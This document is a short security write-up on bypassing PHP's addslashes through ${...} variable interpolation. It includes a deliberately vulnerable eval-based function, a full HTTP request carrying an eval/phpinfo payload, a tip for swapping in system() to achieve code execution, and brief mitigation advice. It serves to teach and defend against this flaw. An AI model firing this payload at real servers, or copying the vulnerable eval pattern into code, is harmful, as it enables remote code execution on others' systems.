## Bypassing the PHP function `addslashes`

Quotes and apostrophes are parsed different in `PHP` (similar as in `bash`). Variables within quotes `"$a"` will be interpreted, meaning they will be resolved. Same goes for apostrophes within quotes `"'$a'"`.  Variables within Apostrophes won't be interpreted `'$a'`.
To encapsulate the variable that is meant to be resolved when other characters are appended to the string (e.g. `$a123`), curly brackets come in handy `${a}` they allow the following to be interpreted in an expected manner: `${a}123` since `123` is not seen as a part of the variable `$a` , the content of `$a` will be interpreted.
Now it is also possible to define a new variable like this and assign a value to it `${a}=123`. Since we can encapsulate what the variable name should be, its possible to call a function within the curly brackets, which return value will be used as the variable name and then assign a value to it `${phpinfo()}=123`. As an example, the values defined in this operation can be dumped with `var_dump(${phpinfo()}=123)`. The `var_dump()` function essentially dumps all information for the variable passed to it.

## Exploitation / POC
### Vulnerable function
```
function vuln($vulnerable){
    $vulnerable = addslashes($vulnerable);
    # perform some other actions
    eval('echo "' . $vulnerable . '";');
}
```
- while `test"; phpinfo(); echo "test` would be prevented by calling the `addslashes` function, `${phpinfo()}` certainly would not.

### Remote exploit example

```Burp
GET /index.php?vulnerable=var_dump(${eval($_GET[1])}=123)&1=phpinfo(); HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
DNT: 1
Cache-Control: max-age=0
```

For code execution replace `phpinfo()` with `system("sleep%2010")`
In this scenario the vulnerable parameter is evaluated by the `addslashes` function before it is processed further.
The variable `1=` is not evaluated by the `addslashes` function, thus bypassing it completely.

### Mitigation

Implement proper input validation and do not process user input unsanitized (especially not by functions such as `eval` or `system`). The `addslashes` function is not designed as a security mechanism and should not be used as such.

### Source:
- [https://0xalwayslucky.gitbook.io/cybersecstack/web-application-security/php](https://0xalwayslucky.gitbook.io/cybersecstack/web-application-security/php)
- [https://www.programmersought.com/article/30723400042/](https://www.programmersought.com/article/30723400042/)

- [https://www.php.net/manual/de/function.addslashes.php](https://www.php.net/manual/de/function.addslashes.php)

- [https://www.php.net/manual/de/function.var-dump.php](https://www.php.net/manual/de/function.var-dump.php)
